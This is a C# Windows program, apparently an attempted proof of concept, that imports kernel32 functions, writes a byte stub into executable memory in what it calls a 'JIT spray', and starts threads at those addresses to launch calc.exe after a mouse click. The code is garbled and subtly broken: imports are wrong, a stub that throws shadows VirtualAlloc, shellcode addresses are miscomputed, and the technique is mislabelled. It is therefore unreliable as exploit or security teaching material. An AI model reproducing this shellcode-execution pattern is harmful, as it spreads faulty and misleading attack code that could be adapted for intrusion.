using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

class Program
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(
        IntPtr hProcess,
        IntPtr lpAddress,
        UInt32 dwSize,
        UInt32 flAllocationType,
        UInt32 flProtect
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(
        string lpFileName
    );

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string lpProcName
    );

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    public static extern short GetAsyncKeyState(
        int vKey
    );

    [DllImport("kernel32.dll")]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(
        string lpModuleName
    );

    [DllImport("kernel32.dll")]
    public static extern bool FreeLibrary(IntPtr hModule);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        UInt32 dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        UInt32 dwCreationFlags,
        out UInt32 lpThreadId
    );

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        UInt32 nSize,
        out UInt32 lpNumberOfBytesWritten
    );

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        UInt32 dwSize,
        UInt32 flNewProtect,
        out UInt32 lpflOldProtect
    );

    static uint CalcThread(IntPtr lpParameter)
    {
        IntPtr hProcess = lpParameter;
        IntPtr hModule = LoadLibrary("user32.dll");
        if (hModule != IntPtr.Zero)
        {
            IntPtr pGetAsyncKeyState = GetProcAddress(hModule, "GetAsyncKeyState");
            if (pGetAsyncKeyState != IntPtr.Zero)
            {
                do
                {
                    if (GetAsyncKeyState(0x01) != 0)
                    {
                        STARTUPINFO startupInfo = new STARTUPINFO();
                        PROCESS_INFORMATION processInfo; // Declare a variable of type PROCESS_INFORMATION
                        _ = CreateProcess("calc.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo); // Pass the processInfo variable as an argument
                        break;
                    }
                    System.Threading.Thread.Sleep(10);
                } while (true);
            }
        }
        return 0;
    }

    private static void Main()
    {
        // Allocate a large block of memory using VirtualAlloc
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint PAGE_EXECUTE_READ = 0x20;
        const uint MEM_PRIVATE = 0x00002000;

        uint[] jmpCode = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x90, 0x90, 0xCC };
        byte[] jmpCodeBytes = new byte[jmpCode.Length];

        for (int i = 0; i < jmpCode.Length; i++)
        {
            jmpCodeBytes[i] = (byte)jmpCode[i];
        }

        uint bufferSize = 1000000;
        uint lpOverlapped = 0;
        IntPtr lpAddress = VirtualAlloc(IntPtr.Zero, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        // Write the JIT spray payload
        UInt32 bytesWritten;
        WriteProcessMemory(GetCurrentProcess(), lpAddress, jmpCodeBytes, (uint)jmpCodeBytes.Length, out bytesWritten);

        // Calculate the address of the shellcode
        uint shellcodeAddress = (uint)(lpAddress.ToInt32() + (uint)jmpCode.Length);

        // Change the memory protection of the shellcode to execute
        uint flOldProtect;
        VirtualProtect(new IntPtr(shellcodeAddress), (uint)jmpCodeBytes.Length, PAGE_EXECUTE_READ, out flOldProtect);

       // Address of the CalcThread function
       IntPtr pCalcThread = Marshal.GetFunctionPointerForDelegate(CalcThread);

        // Create a new thread to execute the shellcode
        UInt32 threadId;
        CreateThread(IntPtr.Zero, 0, pCalcThread, new IntPtr(GetCurrentProcess().ToInt32()), 0, out threadId);

        // Execute the shellcode
        IntPtr hModule = LoadLibrary("kernel32.dll");
        if (hModule != IntPtr.Zero)
        {
            IntPtr pVirtualProtect = GetProcAddress(hModule, "VirtualProtect");
            if (pVirtualProtect != IntPtr.Zero)
            {
                IntPtr pCreateThread = GetProcAddress(hModule, "CreateThread");
                if (pCreateThread != IntPtr.Zero)
                {
                    IntPtr pGetCurrentProcess = GetProcAddress(hModule, "GetCurrentProcess");
                    if (pGetCurrentProcess != IntPtr.Zero)
                    {
                        IntPtr pWriteProcessMemory = GetProcAddress(hModule, "WriteProcessMemory");
                        if (pWriteProcessMemory != IntPtr.Zero)
                        {
                            IntPtr pVirtualAlloc = GetProcAddress(hModule, "VirtualAlloc");
                            if (pVirtualAlloc != IntPtr.Zero)
                            {
                                IntPtr pGetAsyncKeyState = GetProcAddress(hModule, "GetAsyncKeyState");
                                if (pGetAsyncKeyState != IntPtr.Zero)
                                {
                                    IntPtr pCreateProcess = GetProcAddress(hModule, "CreateProcessA");
                                    if (pCreateProcess != IntPtr.Zero)
                                    {
                                        IntPtr pGetStartupInfo = GetProcAddress(hModule, "GetStartupInfoA");
                                        if (pGetStartupInfo != IntPtr.Zero)
                                        {
                                            IntPtr pGetProcessInformation = GetProcAddress(hModule, "GetProcessInformation");
                                            if (pGetProcessInformation != IntPtr.Zero)
                                            {
                                                // JIT spraying
                                                for (uint i = 0; i < bufferSize / jmpCodeBytes.Length; i++)
                                                {
                                                    WriteProcessMemory(
                                                        GetCurrentProcess(),
                                                        new IntPtr((i * jmpCodeBytes.Length) + lpAddress.ToInt32()),
                                                        jmpCodeBytes,
                                                        (uint)jmpCodeBytes.Length,
                                                        out bytesWritten
                                                    );
                                                }

                                                // Trigger the JIT spray
                                                IntPtr pExecuteJit = new IntPtr(shellcodeAddress);
                                                CreateThread(IntPtr.Zero, 0, pExecuteJit, IntPtr.Zero, 0, out threadId);

                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        
        Console.WriteLine("Press Enter to exit.");
        Console.ReadLine();
    }

    private static nint VirtualAlloc(nint zero, uint bufferSize, uint v, uint pAGE_EXECUTE_READWRITE)
    {
        throw new NotImplementedException();
    }
}


[StructLayout(LayoutKind.Sequential)]
public struct STARTUPINFO
{
    public Int32 cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public Int32 dwX;
    public Int32 dwY;
    public Int32 dwXSize;
    public Int32 dwYSize;
    public Int32 dwXCountChars;
    public Int32 dwYCountChars;
    public Int32 dwFillAttribute;
    public Int32 dwFlags;
    public Int16 wShowWindow;
    public Int16 cbReserved2;
    public IntPtr lpReserved2;
    public Int32 hStdInput;
    public Int32 hStdOutput;
    public Int32 hStdError;
}

[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
    public IntPtr hProcess;
    public IntPtr hThread;
    public Int32 dwProcessId;
    public Int32 dwThreadId;
}